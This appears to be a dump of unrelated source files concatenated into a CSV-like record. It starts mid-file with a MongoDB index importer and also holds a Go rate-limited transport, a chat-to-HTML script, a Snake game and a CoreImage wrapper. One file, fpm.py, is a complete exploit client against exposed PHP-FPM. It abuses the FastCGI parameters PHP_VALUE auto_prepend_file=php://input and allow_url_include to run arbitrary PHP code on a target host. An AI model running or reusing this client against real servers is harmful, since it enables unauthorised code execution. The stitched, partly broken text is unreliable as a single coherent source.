name,code
 } catch (err) { continue; }
 
 let json = { 'name': collection, 'indexes': [] };


 for (let j in indexes) {
 let idx = indexes[j];
 let doc = { 'name': idx['name'], 'key': idx['key'] };
 if ('expireAfterSeconds' in idx) {
 doc['expireAfterSeconds'] = idx['expireAfterSeconds'];
 }


 if ('background' in idx) {
 doc['background'] = idx['background'];
 }


 if ('unique' in idx) {
 doc['unique'] = idx['unique'];
 }


 if('collation' in idx) {
 doc['collation'] = {
 'locale': idx['collation']['locale'],
 'strength': idx['collation']['strength'],
 };
 }


 json['indexes'].push(doc)
 }
 index_data['collections'].push(json);
};
print('let indexes = ');
printjson(index_data);
print(';');
/*
How to (required index.js exported from exporter.js)
* mongo is mongoshell command

mongo dbname --quiet --eval ""let mode='DRYRUN';"" mongodbIndexImporter.js

 */


// available modes
let LIVE = 'LIVE';
let DRYRUN = 'DRYRUN'; // actually all other words except 'LIVE' are DRYRUN mode.


load('index.js');
if(typeof mode == 'undefined') {
 print(red('mode variable required!')+' '+cyan('--eval ""let mode=\'DRYRUN\';"" or ""let mode=\'LIVE\';'));
}
else {
 print('*** Index importer: started with ' + yellow(mode) + ' mode ***');


 let collections = indexes['collections'];
 let collectionNames = db.getCollectionNames();


 for (let i in collections) {
 let collection = collections[i];
 let indexItems = collection[""indexes""];
 let collectionName = collection['name'];
 print('='.repeat(55));
 if (collectionNames.indexOf(collectionName) >=0) {
 print('collection '+ green(collectionName) + ' already '+green('exists'));
 } else {
 print('will '+yellow('create')+' collection '+ green(collectionName));
 if (mode == LIVE) {
 // do create collection
 db.createCollection(collectionName)
 }
 }


 let dbCollection = db.getCollection(collectionName);
 let existingIndexes = dbCollection.getIndexes();


 for(let itemIdx in indexItems) {
 let indexItem = indexItems[itemIdx];
 let indexName = indexItem['name'];
 let indexKey = indexItem['key'];
 let checked = false;
 for(let eIdx in existingIndexes) {
 let existingIndex = existingIndexes[eIdx];
 if (existingIndex['name'] == indexName) {
 if(!isSameKey(existingIndex, indexItem)) {
 print('collection '+green(collectionName)+' index '+green(indexName)+' will be '+red('dropped'));
 print('collection '+green(collectionName)+' index '+green(indexName)+' will be '+yellow('re-created'));
 if(mode == LIVE) {
 dbCollection.dropIndex(indexName);
 createIndex(dbCollection, indexName, indexItem);
 }
 }
 else {
 print('collection '+green(collectionName)+' index '+green(indexName)+' is same, skip.');
 }
 checked = true;
 break
 }
 }


 if (!checked) {
 print('collection '+green(collectionName)+' index '+green(indexName)+' will be '+yellow('created'));
 if(mode == LIVE) {
 createIndex(dbCollection, indexName, indexItem);
 }
 }
 }
 
 for(let eIdx in existingIndexes) {
 let checked = false;
 let existingIndex = existingIndexes[eIdx];
 for(let itemIdx in indexItems) {
 let indexItem = indexItems[itemIdx];
 let indexName = indexItem['name'];
 if (existingIndex['name'] == indexName) {
 checked = true
 break
 }
 }


 if (!checked) {
 print('collection '+green(collectionName)+' index '+green(existingIndex[""name""])+' will be '+red('dropped'));
 if (mode == LIVE) {
 dbCollection.dropIndex(existingIndex[""name""]);
 }
 }
 }
 }


 if (mode == LIVE) {
 print('Completed! '+magenta('LIVE MODE. All Operatoins are applied on database!'));
 }
 else {
 print('Completed! '+cyan('TEST MODE. Nothing is applied.'));
 }
}


function createIndex(db, name, indexItem) {
 let options = {'name': name};
 let key = indexItem['key'];
 if('expireAfterSeconds' in indexItem) {
 options['expireAfterSeconds'] = indexItem['expireAfterSeconds'];
 }


 if('background' in indexItem) {
 options['background'] = indexItem['background'];
 }


 if('unique' in indexItem) {
 options['unique'] = indexItem['unique'];
 }
 
 if('collation' in indexItem) {
 options['collation'] = indexItem['collation'];
 }
 
 db.createIndex(key, options);
}


function isSameKey(existingIndex, newIndex) {
 let key = existingIndex['key'];
 let newKey = newIndex['key'];


 // -2: v, ns
 let excepted = 0;
 for (let keyName in existingIndex) {
 if (keyName === ""v"") {
 excepted++
 continue
 }


 if (keyName === ""ns"") {
 excepted++
 }
 }
 
 if (Object.keys(existingIndex).length -excepted != Object.keys(newIndex).length) {
 return false;
 }


 if (Object.keys(key).length != Object.keys(newKey).length) {
 return false;
 }


 for(let i in key) {
 let val = key[i];
 if(i in newKey) {
 if(newKey[i] != val) {
 return false;
 }
 }
 else {
 return false;
 }
 }
 let except = ['v', 'ns', 'key'];
 for (let element in existingIndex) {
 if (except.indexOf(element) >= 0) {
 continue;
 }


 if (existingIndex[element] != newIndex[element]) {
 let a = existingIndex[element];
 let b = newIndex[element];
 if (isObject(a) && isObject(b)) {
 print(element)
 for (let el in b) {
 if (a[el] != b[el]) {
 return false;
 }
 }
 return true;


 }
 return false;
 }
 }
 return true;
}


function isObject(val) {
 if (val === null) { return false;}
 return ( (typeof val === 'function') || (typeof val === 'object') );
}


// colors
function red (text) { return colorize(text, 'red') }
function green (text) { return colorize(text, 'green') }
function yellow (text) { return colorize(text, 'yellow') }
function blue (text) { return colorize(text, 'blue') }
function magenta (text) { return colorize(text, 'magenta') }
function cyan (text) { return colorize(text, 'cyan') }
function gray (text) { return colorize(text, 'gray') }


function colorize(text, color, style) {
 // color: 'red', 'green', 'blue'... (see below)
 // styles: 'normal' or undefined, 'bright', 'highlight'


 if (!style) {
 style = 'normal';
 }


 let _ansi = {
 csi: String.fromCharCode(0x1B) + '[',
 reset:      '0',
 text_prop:  'm',


 styles: {
 normal: '3',
 bright:     '9',
 highlight:  '4'
 },


 colors: {
 black:   '0',
 red:     '1',
 green:   '2',
 yellow:  '3',
 blue:    '4',
 magenta: '5',
 cyan:    '6',
 gray:    '7'
 }
 };


 let beginColor = _ansi.csi + _ansi.styles[style] + _ansi.colors[color] + _ansi.text_prop;
 let endColor = _ansi.csi + _ansi.reset + _ansi.text_prop;


 return beginColor + text + endColor;
}
==<SEPERATOR>==
throttled_transport.go
package main


import (
 ""net/http""
 ""time""


 ""golang.org/x/time/rate""
)


// ThrottledTransport Rate Limited HTTP Client
type ThrottledTransport struct {
 roundTripperWrap http.RoundTripper
 ratelimiter *rate.Limiter
}


func (c *ThrottledTransport) RoundTrip(r *http.Request) (*http.Response, error) {
 err := c.ratelimiter.Wait(r.Context()) // This is a blocking call. Honors the rate limit
 if err != nil {
 return nil, err
	}
 return c.roundTripperWrap.RoundTrip(r)
}


// NewThrottledTransport wraps transportWrap with a rate limitter
// examle usage:
// client := http.DefaultClient
// client.Transport = NewThrottledTransport(10*time.Seconds, 60, http.DefaultTransport) allows 60 requests every 10 seconds
func NewThrottledTransport(limitPeriod time.Duration, requestCount int, transportWrap http.RoundTripper) http.RoundTripper {
 return &ThrottledTransport{
 roundTripperWrap: transportWrap,
 ratelimiter:      rate.NewLimiter(rate.Every(limitPeriod), requestCount),
	}
}
==<SEPERATOR>==
gen_chat_html.py
import json
import argparse
import html
import os
from datetime import datetime


def generate_html(json_file, html_file=""chat.html"", metadata=None, date=None):
 with open(json_file, 'r') as file:
 data = json.load(file)


 html_content = """"
 html_content += '<!DOCTYPE html>'
 html_content += '<html><head><link rel=""stylesheet"" href=""style.css"">'
 html_content += f'<title>LM-Studio Chat with {metadata[""lastUsedModel""][""title""]}</title>'
 html_content += '<script src=""https://cdnjs.cloudflare.com/ajax/libs/markdown-it/13.0.2/markdown-it.min.js"" integrity=""sha512-ohlWmsCxOu0bph1om5eDL0jm/83eH09fvqLDhiEdiqfDeJbEvz4FSbeY0gLJSVJwQAp0laRhTXbUQG+ZUuifUQ=="" crossorigin=""anonymous"" referrerpolicy=""no-referrer""></script>'
 html_content += '<link rel=""stylesheet"" href=""https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css"">'
 html_content += '<script src=""https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js""></script>'
 html_content += '</head><body>'
 # Header with the model name and date
 html_content += '<div class=""header"">'
 html_content += '<h1>LM-Studio Chat</h1>'
 html_content += f'<p><strong>Model</strong>: {metadata[""lastUsedModel""][""title""]}</p>'
 html_content += f'<p><strong>Date</strong>: {date.strftime(""%B %d, %Y %H:%M:%S %p"")}</p>'
 html_content += '</div>'
 # Chat messages
 html_content += '<div class=""chat"">'
 for message in data['messages']:
 role_class = ""user"" if message['role'] == ""user"" else ""assistant""
 html_content += f'<h3 class=""{role_class}"">{message[""role""].title()}</h3>'
 html_content += f'<div class=""{role_class}""><div class=""content"">{html.escape(message[""content""])}</div></div>'
 html_content += '</div>'
 html_content += """"""
<script>
document.addEventListener('DOMContentLoaded', (event) => {
    const md = new markdownit();
    document.querySelectorAll("".content"").forEach(block => {
        block.innerHTML = md.render(block.textContent);
    });

    document.querySelectorAll(""pre code"").forEach(block => {
        hljs.highlightElement(block);
    });
});
</script>
""""""
 html_content += '</body></html>'


 with open(html_file, ""w"") as output_file:
 output_file.write(html_content)


def main():
 parser = argparse.ArgumentParser(description='Generate HTML file from JSON file')
 parser.add_argument('json_file', metavar='json_file', type=str, help='JSON file')
 parser.add_argument('-O', '--output', metavar='output_file', type=str, help='output HTML file', default=""chat.html"")
 args = parser.parse_args()


 # Load the metadata file given the chat file
 # If args.file is '/Users/moyix/.cache/lm-studio/chats/1700066024624.chat.json'
 # metadata will be in '/Users/moyix/.cache/lm-studio/chats/1700066024624.metadata.chat.json'
 metadata_file = args.json_file.replace("".chat.json"", "".metadata.chat.json"")
 metadata = json.load(open(metadata_file, 'r'))


 # Get the timestamp from the filename; it's in milliseconds since epoch
 timestamp = int(os.path.basename(args.json_file).split(""."")[0])
 date = datetime.fromtimestamp(timestamp / 1000.0)


 generate_html(args.json_file, args.output, metadata, date)


if __name__ == ""__main__"":
 main()
body {
 font-family: Arial, sans-serif;
 background-color: #f4f4f4;
}


.chat, .header {
 max-width: 600px;
 margin: 20px auto;
 border: 1px solid #ddd;
 padding: 10px;
 background: white;
}


.user, .assistant {
 margin-bottom: 10px;
}


.user {
 text-align: left;
}


.assistant {
 text-align: left;
}


.content {
 padding: 5px 10px;
 border-radius: 5px;
 background: #eee;
}


pre code {
 background-color: #f4f4f4;
 border: 1px solid #ccc;
 display: block;
 padding: 10px;
 overflow-x: auto;
}
"
"fpm.py
","import socket
import random
import argparse
import sys
from io import BytesIO


# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client


PY2 = True if sys.version_info.major == 2 else False




def bchr(i):
 if PY2:
 return force_bytes(chr(i))
 else:
 return bytes([i])


def bord(c):
 if isinstance(c, int):
 return c
 else:
 return ord(c)


def force_bytes(s):
 if isinstance(s, bytes):
 return s
 else:
 return s.encode('utf-8', 'strict')


def force_text(s):
 if issubclass(type(s), str):
 return s
 if isinstance(s, bytes):
 s = str(s, 'utf-8', 'strict')
 else:
 s = str(s)
 return s




class FastCGIClient:
 """"""A Fast-CGI Client for Python""""""


 # private
 __FCGI_VERSION = 1


 __FCGI_ROLE_RESPONDER = 1
 __FCGI_ROLE_AUTHORIZER = 2
 __FCGI_ROLE_FILTER = 3


 __FCGI_TYPE_BEGIN = 1
 __FCGI_TYPE_ABORT = 2
 __FCGI_TYPE_END = 3
 __FCGI_TYPE_PARAMS = 4
 __FCGI_TYPE_STDIN = 5
 __FCGI_TYPE_STDOUT = 6
 __FCGI_TYPE_STDERR = 7
 __FCGI_TYPE_DATA = 8
 __FCGI_TYPE_GETVALUES = 9
 __FCGI_TYPE_GETVALUES_RESULT = 10
 __FCGI_TYPE_UNKOWNTYPE = 11


 __FCGI_HEADER_SIZE = 8


 # request state
 FCGI_STATE_SEND = 1
 FCGI_STATE_ERROR = 2
 FCGI_STATE_SUCCESS = 3


 def __init__(self, host, port, timeout, keepalive):
 self.host = host
 self.port = port
 self.timeout = timeout
 if keepalive:
 self.keepalive = 1
 else:
 self.keepalive = 0
 self.sock = None
 self.requests = dict()


 def __connect(self):
 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 self.sock.settimeout(self.timeout)
 self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 # if self.keepalive:
 #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
 # else:
 #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
 try:
 self.sock.connect((self.host, int(self.port)))
 except socket.error as msg:
 self.sock.close()
 self.sock = None
 print(repr(msg))
 return False
 return True


 def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
 length = len(content)
 buf = bchr(FastCGIClient.__FCGI_VERSION) \
 + bchr(fcgi_type) \
 + bchr((requestid >> 8) & 0xFF) \
 + bchr(requestid & 0xFF) \
 + bchr((length >> 8) & 0xFF) \
 + bchr(length & 0xFF) \
 + bchr(0) \
 + bchr(0) \
 + content
 return buf


 def __encodeNameValueParams(self, name, value):
 nLen = len(name)
 vLen = len(value)
 record = b''
 if nLen < 128:
 record += bchr(nLen)
 else:
 record += bchr((nLen >> 24) | 0x80) \
 + bchr((nLen >> 16) & 0xFF) \
 + bchr((nLen >> 8) & 0xFF) \
 + bchr(nLen & 0xFF)
 if vLen < 128:
 record += bchr(vLen)
 else:
 record += bchr((vLen >> 24) | 0x80) \
 + bchr((vLen >> 16) & 0xFF) \
 + bchr((vLen >> 8) & 0xFF) \
 + bchr(vLen & 0xFF)
 return record + name + value


 def __decodeFastCGIHeader(self, stream):
 header = dict()
 header['version'] = bord(stream[0])
 header['type'] = bord(stream[1])
 header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
 header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
 header['paddingLength'] = bord(stream[6])
 header['reserved'] = bord(stream[7])
 return header


 def __decodeFastCGIRecord(self, buffer):
 header = buffer.read(int(self.__FCGI_HEADER_SIZE))


 if not header:
 return False
 else:
 record = self.__decodeFastCGIHeader(header)
 record['content'] = b''
 
 if 'contentLength' in record.keys():
 contentLength = int(record['contentLength'])
 record['content'] += buffer.read(contentLength)
 if 'paddingLength' in record.keys():
 skiped = buffer.read(int(record['paddingLength']))
 return record


 def request(self, nameValuePairs={}, post=''):
 if not self.__connect():
 print('connect failure! please check your fasctcgi-server !!')
 return


 requestId = random.randint(1, (1 << 16) - 1)
 self.requests[requestId] = dict()
 request = b""""
 beginFCGIRecordContent = bchr(0) \
 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
 + bchr(self.keepalive) \
 + bchr(0) * 5
 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
 beginFCGIRecordContent, requestId)
 paramsRecord = b''
 if nameValuePairs:
 for (name, value) in nameValuePairs.items():
 name = force_bytes(name)
 value = force_bytes(value)
 paramsRecord += self.__encodeNameValueParams(name, value)


 if paramsRecord:
 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)


 if post:
 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)


 self.sock.send(request)
 self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
 self.requests[requestId]['response'] = b''
 return self.__waitForResponse(requestId)


 def __waitForResponse(self, requestId):
 data = b''
 while True:
 buf = self.sock.recv(512)
 if not len(buf):
 break
 data += buf


 data = BytesIO(data)
 while True:
 response = self.__decodeFastCGIRecord(data)
 if not response:
 break
 if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
 or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
 if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
 self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
 if requestId == int(response['requestId']):
 self.requests[requestId]['response'] += response['content']
 if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
 self.requests[requestId]
 return self.requests[requestId]['response']


 def __repr__(self):
 return ""fastcgi connect host:{} port:{}"".format(self.host, self.port)




if __name__ == '__main__':
 parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
 parser.add_argument('host', help='Target host, such as 127.0.0.1')
 parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
 parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')
 parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)


 args = parser.parse_args()


 client = FastCGIClient(args.host, args.port, 3, 0)
 params = dict()
 documentRoot = ""/""
 uri = args.file
 content = args.code
 params = {
 'GATEWAY_INTERFACE': 'FastCGI/1.0',
 'REQUEST_METHOD': 'POST',
 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
 'SCRIPT_NAME': uri,
 'QUERY_STRING': '',
 'REQUEST_URI': uri,
 'DOCUMENT_ROOT': documentRoot,
 'SERVER_SOFTWARE': 'php/fcgiclient',
 'REMOTE_ADDR': '127.0.0.1',
 'REMOTE_PORT': '9985',
 'SERVER_ADDR': '127.0.0.1',
 'SERVER_PORT': '80',
 'SERVER_NAME': ""localhost"",
 'SERVER_PROTOCOL': 'HTTP/1.1',
 'CONTENT_TYPE': 'application/text',
 'CONTENT_LENGTH': ""%d"" % len(content),
 'PHP_VALUE': 'auto_prepend_file = php://input',
 'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }
 response = client.request(params, content)
 print(force_text(response))
"
"snake_game.py
","# Simple Snake Game in Python 3 for Beginners
# By @TokyoEdTech


import turtle
import time
import random


delay = 0.1


# Score
score = 0
high_score = 0


# Set up the screen
wn = turtle.Screen()
wn.title(""Snake Game by @TokyoEdTech"")
wn.bgcolor(""green"")
wn.setup(width=600, height=600)
wn.tracer(0) # Turns off the screen updates


# Snake head
head = turtle.Turtle()
head.speed(0)
head.shape(""square"")
head.color(""black"")
head.penup()
head.goto(0,0)
head.direction = ""stop""


# Snake food
food = turtle.Turtle()
food.speed(0)
food.shape(""circle"")
food.color(""red"")
food.penup()
food.goto(0,100)


segments = []


# Pen
pen = turtle.Turtle()
pen.speed(0)
pen.shape(""square"")
pen.color(""white"")
pen.penup()
pen.hideturtle()
pen.goto(0, 260)
pen.write(""Score: 0  High Score: 0"", align=""center"", font=(""Courier"", 24, ""normal""))


# Functions
def go_up():
 if head.direction != ""down"":
 head.direction = ""up""


def go_down():
 if head.direction != ""up"":
 head.direction = ""down""


def go_left():
 if head.direction != ""right"":
 head.direction = ""left""


def go_right():
 if head.direction != ""left"":
 head.direction = ""right""


def move():
 if head.direction == ""up"":
 y = head.ycor()
 head.sety(y + 20)


 if head.direction == ""down"":
 y = head.ycor()
 head.sety(y - 20)


 if head.direction == ""left"":
 x = head.xcor()
 head.setx(x - 20)


 if head.direction == ""right"":
 x = head.xcor()
 head.setx(x + 20)


# Keyboard bindings
wn.listen()
wn.onkeypress(go_up, ""w"")
wn.onkeypress(go_down, ""s"")
wn.onkeypress(go_left, ""a"")
wn.onkeypress(go_right, ""d"")


# Main game loop
while True:
 wn.update()


 # Check for a collision with the border
 if head.xcor()>290 or head.xcor()<-290 or head.ycor()>290 or head.ycor()<-290:
 time.sleep(1)
 head.goto(0,0)
 head.direction = ""stop""


 # Hide the segments
 for segment in segments:
 segment.goto(1000, 1000)
 
 # Clear the segments list
 segments.clear()


 # Reset the score
 score = 0


 # Reset the delay
 delay = 0.1


 pen.clear()
 pen.write(""Score: {}  High Score: {}"".format(score, high_score), align=""center"", font=(""Courier"", 24, ""normal"")) 




 # Check for a collision with the food
 if head.distance(food) < 20:
 # Move the food to a random spot
 x = random.randint(-290, 290)
 y = random.randint(-290, 290)
 food.goto(x,y)


 # Add a segment
 new_segment = turtle.Turtle()
 new_segment.speed(0)
 new_segment.shape(""square"")
 new_segment.color(""grey"")
 new_segment.penup()
 segments.append(new_segment)


 # Shorten the delay
 delay -= 0.001


 # Increase the score
 score += 10


 if score > high_score:
 high_score = score
 
 pen.clear()
 pen.write(""Score: {}  High Score: {}"".format(score, high_score), align=""center"", font=(""Courier"", 24, ""normal"")) 


 # Move the end segments first in reverse order
 for index in range(len(segments)-1, 0, -1):
 x = segments[index-1].xcor()
 y = segments[index-1].ycor()
 segments[index].goto(x, y)


 # Move segment 0 to where the head is
 if len(segments) > 0:
 x = head.xcor()
 y = head.ycor()
 segments[0].goto(x,y)


 move()    


 # Check for head collision with the body segments
 for segment in segments:
 if segment.distance(head) < 20:
 time.sleep(1)
 head.goto(0,0)
 head.direction = ""stop""
 
 # Hide the segments
 for segment in segments:
 segment.goto(1000, 1000)
 
 # Clear the segments list
 segments.clear()


 # Reset the score
 score = 0


 # Reset the delay
 delay = 0.1
 
 # Update the score display
 pen.clear()
 pen.write(""Score: {}  High Score: {}"".format(score, high_score), align=""center"", font=(""Courier"", 24, ""normal""))


 time.sleep(delay)


wn.mainloop()
"
"core_image.py
","'''
This module provides a Python wrapper around CIImage and CIFilter for using CoreImage filters from Pythonista more easily.

How to use:

1) Create a CImage object. The constructor accepts either a file path, a ui.Image, PIL.Image.Image, or photos.Asset object. Example:

>>> # From a photo:
>>> img = CImage(photos.pick_asset())
>>> # From a ui.Image:
>>> img2 = CImage(ui.Image.named('test:Peppers'))
>>> # From a file:
>>> img3 = CImage('MyImage.jpg')

2) Apply a filter using the CImage object's filter() method. The list of available filters and their parameter names can be found here:
https://developer.apple.com/library/content/documentation/GraphicsImaging/Reference/CoreImageFilterReference/index.html

The result is another CImage object that can be filtered again, to build a filter chain. When all filters have been applied, you can 
use the show() method to display the result in the console, or save_jpeg()/save_png() to save it to a file.

Filter parameters are passed to the filter() method as keyword arguments. If a parameter name begins with ""input"" (almost all do),
that prefix can be left out for better readability (e.g. inputSaturation=... becomes just saturation=...).

The filter reference will tell you which type each parameter should be. This can be translated to Python as follows:

NSNumber:		int or float
CIVector:		tuple of numbers (int or float), often x/y coordinates
CIImage:		CImage object
CIColor:		Either a color string (e.g. '#ff000', 'red'), a tuple with 3 or 4 numbers (rgb[a]) in the range 0.0-1.0,
			or a number (grayscale value)
NSString:		str
NSData:			bytes or str (the latter will be utf-8-encoded)

Example:

>>> img = CImage(photos.pick_asset())
>>> img2 = img.filter('CIColorControls', saturation=2.0, contrast=1.5)
>>> img3 = img2.filter('CIGaussianBlur', radius=10)
>>> img3.show()

The inputImage parameter is always set automatically. If a filter doesn't have an inputImage parameter
(e.g. a gradient or barcode generator), you can just create an empty CImage and ""filter"" that.
Example:

>>> empty = CImage()
>>> qrcode = empty.filter('CIQRCodeGenerator', message='Hello World')
>>> qrcode.show()
'''


from objc_util import *
import photos
import os
import ui
import PIL.Image
import tempfile
import numbers


class CImage(object):
 def __init__(self, img_or_path=None):
 CIImage = ObjCClass('CIImage')
 if img_or_path is None:
 self.ci_img = CIImage.emptyImage()
 return
 if isinstance(img_or_path, ObjCInstance):
 if img_or_path.isKindOfClass_(CIImage):
 self.ci_img = img_or_path
 return
 if isinstance(img_or_path, PIL.Image.Image):
 buffer = io.BytesIO()
 img_or_path.save(buffer, 'PNG')
 img_or_path = ui.Image.from_data(buffer)
 if isinstance(img_or_path, photos.Asset):
 img_or_path = img_or_path.get_ui_image()
 if isinstance(img_or_path, ui.Image):
 self.ci_img = CIImage.imageWithCGImage_(ObjCInstance(img_or_path).CGImage())
 elif isinstance(img_or_path, str):
 file_url = nsurl(os.path.abspath(img_or_path))
 self.ci_img = CIImage.imageWithContentsOfURL_(file_url)
 else:
 raise TypeError('unsupported type for initializing CImage')


 def filter(self, name, **params):
 CIFilter = ObjCClass('CIFilter')
 CIVector = ObjCClass('CIVector')
 CIColor = ObjCClass('CIColor')
 filter = CIFilter.filterWithName_(name)
 if not filter:
 raise ValueError('Invalid filter name')
 filter.setDefaults()
 input_keys = [str(k) for k in filter.inputKeys()]
 attrs = filter.attributes()
 input_key_types = {
 str(k): str(attrs[k]['CIAttributeClass'])
 for k in input_keys
		}
 supported_types = {
 'CIImage': CImage,
 'CIVector': tuple,
 'CIColor': (tuple, numbers.Number, str),
 'NSNumber': numbers.Number,
 'NSData': (bytes, str),
 'NSString': str
		}
 if 'inputImage' in input_keys:
 filter.setValue_forKey_(self.ci_img, 'inputImage')
 for key, value in params.items():
 if key not in input_keys:
 key = 'input' + key[0].upper() + key[1:]
 if key not in input_keys:
 raise ValueError('""%s"" is not a valid parameter for %s' % (key, name))
 param_type = input_key_types[key]
 if param_type not in supported_types:
 raise TypeError('Parameters of type %s are not supported' % param_type)
 expected_type = supported_types[param_type]
 type_matches = isinstance(value, expected_type)
 if not type_matches:
 raise TypeError(
 'Incorrect type for %s parameter (expected %s, got %s)' %
					(key, expected_type, type(value))
				)
 if param_type == 'CIColor':
 if isinstance(value, numbers.Number):
 value = (value, value, value, 1.0)
 elif isinstance(value, str):
 value = ui.parse_color(value)
 if not all(isinstance(n, numbers.Number) for n in value):
 raise TypeError('All color components must be numbers')
 if len(value) == 3:
 ci_color = CIColor.colorWithRed_green_blue_(*value)
 elif len(value) == 4:
 ci_color = CIColor.colorWithRed_green_blue_alpha_(*value)
 else:
 raise TypeError('Color must be a tuple with 3 or 4 RGB(A) values')
 filter.setValue_forKey_(ci_color, key)
 elif param_type == 'CIImage':
 filter.setValue_forKey_(value.ci_img, key)
 elif param_type == 'CIVector':
 arr = (CGFloat * len(value))(*value)
 vector = CIVector.vectorWithValues_count_(arr, len(value))
 filter.setValue_forKey_(vector, key)
 elif param_type == 'NSData' and isinstance(value, str):
 filter.setValue_forKey_(value.encode('utf-8'), key)
 else:
 filter.setValue_forKey_(value, key)
 out_img = filter.valueForKey_('outputImage')
 return CImage(out_img)
 
 def _uiimage_rep(self):
 # Internal helper method for save_jpeg and save_png
 ctx = ObjCClass('CIContext').context()
 extent = self.ci_img.extent()
 m = ctx.outputImageMaximumSize()
 if extent.size.width > m.width or extent.size.height > m.height:
 # This is probably an infinite image, render *something*...
 extent = CGRect(CGPoint(0, 0), CGSize(1024, 1024))
 cg_img = ctx.createCGImage_fromRect_(self.ci_img, extent)
 ui_img = UIImage.imageWithCGImage_(cg_img)
 c.CGImageRelease.argtypes = [c_void_p]
 c.CGImageRelease.restype = None
 c.CGImageRelease(cg_img)
 return ui_img
 
 def save_jpeg(self, filename='output.jpg', quality=1.0):
 ui_img = self._uiimage_rep()
 c.UIImageJPEGRepresentation.argtypes = [c_void_p, CGFloat]
 c.UIImageJPEGRepresentation.restype = c_void_p
 data = ObjCInstance(c.UIImageJPEGRepresentation(ui_img.ptr, quality))
 filename = os.path.abspath(filename)
 return data.writeToFile_atomically_(filename, True)
 
 def save_png(self, filename='output.png'):
 ui_img = self._uiimage_rep()
 c.UIImagePNGRepresentation.argtypes = [c_void_p]
 c.UIImagePNGRepresentation.restype = c_void_p
 data = ObjCInstance(c.UIImagePNGRepresentation(ui_img.ptr))
 filename = os.path.abspath(filename)
 return data.writeToFile_atomically_(filename, True)


 def show(self):
 temp_path = os.path.join(tempfile.gettempdir(), 'cimage_show.png')
 saved = self.save_png(temp_path)
 if saved:
 ui.Image.named(temp_path).show()
 else:
 raise ValueError('Image could not be saved (may be empty)')




def main():
 img = CImage(ui.Image.named('test:Mandrill'))
 img = img.filter('CITwirlDistortion', center=(256, 256), radius=150)
 img = img.filter('CICMYKHalftone')
 img.show()


if __name__ == '__main__':
 main()
 
 
==<SEPERATOR>==
